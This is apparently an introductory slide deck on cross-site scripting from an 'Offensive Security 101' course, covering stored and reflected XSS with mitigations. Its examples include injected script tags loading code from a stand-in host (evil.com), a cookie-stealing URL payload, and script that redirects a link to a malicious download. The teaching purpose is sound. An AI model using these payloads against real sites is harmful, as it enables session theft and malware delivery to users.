---
layout: slide
title:  "Presentation 5 | Cross-site Scripting"
transition: slide
---

<section>

<img width="300px" src="{{site.baseurl}}/assets/images/code_academy.png">

<img width="300px" src="{{site.baseurl}}/assets/images/kali.png">

<h2>Offensive Security 101</h2>

<p><i>Cross-site Scripting</i></p>

</section>

<section>

<h3>OWASP Top 10</h3>
<p style='text-align: left; padding-left: 230px'>
<span style='color: grey'>6: Security Misconfiguration</span>
<br>
7: Cross-Site Scripting
<br>
<span style='color: grey'>8: Insecure Deserialization</span>
</p>	
</section>

<section data-markdown>

#### ...but it's also the 2nd most prevalent vulnerability!

</section>

<section data-markdown>

### Cross-Site Scripting (XSS)

- Occurs when an attacker injects malicious code into a trusted website or application
- User's browser assumes the script came from a trusted source and will execute it

</section>

<section data-markdown>

### What happens?

- The script may be able to access any cookies 
- ...or session tokens 
- ...or other sensitive information retained by the browser
- Most commonly abused by using JavaScript or HTML

</section>

<section data-markdown>

## Stored vs. Reflected

</section>

<section data-markdown>

### Stored XSS

- This happens when malicious code is injected into the site/application itself
- Whenever a victim visits the compromised site, the script is executed

</section>

<section data-markdown>

## Stored XSS Example

</section>

<section>

<pre><code data-trim class="html"><posts>
	<message> ...
	</message>

	<message> ...
	</message>

</posts></code></pre>

A hacker finds a website with a comment section that allows embedded html, with the DOM looking like the above...

</section>

<section>

<pre><code data-trim class="html"><posts>
	<message> ...
	</message>

	<message> ...
	</message>

	<message> 
		Security sux! 
		<script src="http://evil.com/attack.js">
		</script>
	</message>

</posts></code></pre>

They post their own comment, effectively modifying the site's HTML for every user who views it

</section>

<section>

<pre><code data-trim class="html"><posts>
	<message> ...
	</message>

	<message> ...
	</message>

	<message> 
		Security sux! 
		<script src="http://evil.com/attack.js">
		</script>
	</message>

</posts></code></pre>

Now, whenever the page is visited, the script (which is hosted externally) is run in the end user's browser

</section>

<section data-markdown>

### Danger

The victim only has to visit the legitimate page, not even actively click anything, to be attacked

</section>

<section data-markdown>

### Mitigating Stored XSS

- Never insert untrusted data verbatim
- Escaping (HTML/Attribute/Javascript)
- Same Origin Policy (prevents cookies being stolen)

</section>

<section data-markdown>

### Reflected XSS

- Also known as a non-persistent attack
- Occurs when the attack is reflected off the web server, e.g: search results, errors
- The attack is usually in the form of a malicious URL, which the victim unknowingly opens

</section>

<section data-markdown>

## Reflected XSS Examples

</section>

<section>

<h3>welcome-user.php</h3>

<pre><code data-trim class="html">
<page>
	<p>Hello $user and welcome!</p>
</page>
</code></pre>

Consider a website running the above PHP code, where the $user variable is passed as a URL parameter (dangerous!)

</section>

<section>

<h3>welcome-user.php</h3>

<pre><code data-trim class="html">
<page>
	<p>Hello $user and welcome!</p>
</page>
</code></pre>

A hacker might send a user the malicious URL such as: <pre><code data-trim class="html">http://vulnerable.com/welcome-user.php?
	user=<script>stealcookie()</script></code></pre> and hope that they click it

</section>

<section>

<h3>welcome-user.php</h3>

<pre><code data-trim class="html">
<page>
	<p>Hello <script>stealcookie()</script> 
	and welcome!</p>
</page>
</code></pre>

Resulting in the above variable subsitution, obviously not good!

</section>

<section>

<h3>404.php</h3>

<pre><code data-trim class="html">
<page>
	<p>Sorry the following url 
	could not be found: $url</p>
</page>
</code></pre>

Consider perhaps the more realistic scenario of a 404 page that tells the user which page it was that could not be found.

</section>

<section>

<h3>404.php</h3>

<pre><code data-trim class="html">
<page>
	<p>Sorry the following url 
	could not be found: $url</p>
</page>
</code></pre>

Again a hacker could pass a malicious URL such as: <pre><code data-trim class="html">http://vulnerable.com/<script> window.onload = 
function() { var links = document.getElementsByTagName("a");
links[0].href = "http://evil.com/malicious.exe"; }
</script></code></pre>

(Notice how a vulnerable URL parameter isn't required in this example)

</section>

<section>

<h3>404.php</h3>

<pre><code data-trim class="html">
<page>
	<p>Sorry the following url 
	could not be found: <script> ... </script></p>
</page>
</code></pre>

When a user visits the malicious URL it is rendered as above, leading to the script to replace the first link on the page to download malicious.exe, instead of its normal functionality

</section>

<section data-markdown>

### Mitigating Reflected XSS

For the common user:
- Common sense
- Don't click random, suspicious links in emails, social media, forums

For the website owner:
- URL Sanitisation
- More generally, never directly return user entered information

</section>

<section data-markdown>

### Real world examples

- [XSS on Twitter](https://www.theguardian.com/technology/2014/jun/11/twitter-tweetdeck-xss-flaw-users-vulnerable)
- [Script injection used for crypto-mining](https://www.theregister.co.uk/2018/01/27/cryptojackers_slip_coinhive_mining_code_into_doubleclick_ads/)

</section>

<section data-markdown>

## Fin

</section>
